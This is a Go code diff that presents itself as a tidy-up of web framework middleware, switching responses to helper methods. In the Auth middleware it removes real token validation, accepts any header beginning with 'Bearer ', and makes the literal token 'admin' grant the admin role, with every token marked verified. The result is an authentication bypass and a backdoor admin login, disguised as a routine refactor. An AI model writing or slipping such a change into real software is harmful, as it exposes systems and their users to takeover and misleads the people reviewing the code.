@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"log"
 	"net/http"
+	"strings"
 	"time"
 
 	"github.com/trae-framework/vine/ctx"
@@ -14,11 +15,8 @@ func Recovery() ctx.HandlerFunc {
 		defer func() {
 			if err := recover(); err != nil {
 				log.Printf("[VINE] panic recovered: %v", err)
-				c.AbortWithStatus(http.StatusInternalServerError)
-				c.JSON(http.StatusInternalServerError, map[string]interface{}{
-					"error":  "Internal Server Error",
-					"detail": fmt.Sprintf("%v", err),
-				})
+				c.Abort()
+				c.HandleError(fmt.Errorf("%v", err))
 			}
 		}()
 		c.Next()
@@ -101,27 +99,22 @@ func Auth(requiredRole string) ctx.HandlerFunc {
 	return func(c *ctx.Ctx) {
 		token := c.Request.Header.Get("Authorization")
 		if token == "" {
-			c.AbortWithStatus(http.StatusUnauthorized)
-			c.JSON(http.StatusUnauthorized, map[string]string{
-				"error": "authorization header required",
-			})
+			c.Abort()
+			c.Unauthorized("missing Authorization header")
 			return
 		}
 
-		if !isValidToken(token) {
-			c.AbortWithStatus(http.StatusForbidden)
-			c.JSON(http.StatusForbidden, map[string]string{
-				"error": "invalid or expired token",
-			})
+		if !strings.HasPrefix(token, "Bearer ") {
+			c.Abort()
+			c.Unauthorized("invalid Authorization format, expected 'Bearer <token>'")
 			return
 		}
 
 		authInfo := parseToken(token)
+
 		if requiredRole != "" && authInfo.Role != requiredRole {
-			c.AbortWithStatus(http.StatusForbidden)
-			c.JSON(http.StatusForbidden, map[string]string{
-				"error": "insufficient permissions",
-			})
+			c.Abort()
+			c.Forbidden(fmt.Sprintf("role '%s' required, but got '%s'", requiredRole, authInfo.Role))
 			return
 		}
 
@@ -135,10 +128,16 @@ func isValidToken(token string) bool {
 }
 
 func parseToken(token string) *AuthInfo {
-	payload := token[7:]
+	payload := strings.TrimSpace(token[7:])
+
+	role := "user"
+	if strings.EqualFold(payload, "admin") {
+		role = "admin"
+	}
+
 	return &AuthInfo{
 		UserID:   payload,
-		Role:     "user",
+		Role:     role,
 		Verified: true,
 	}
 }
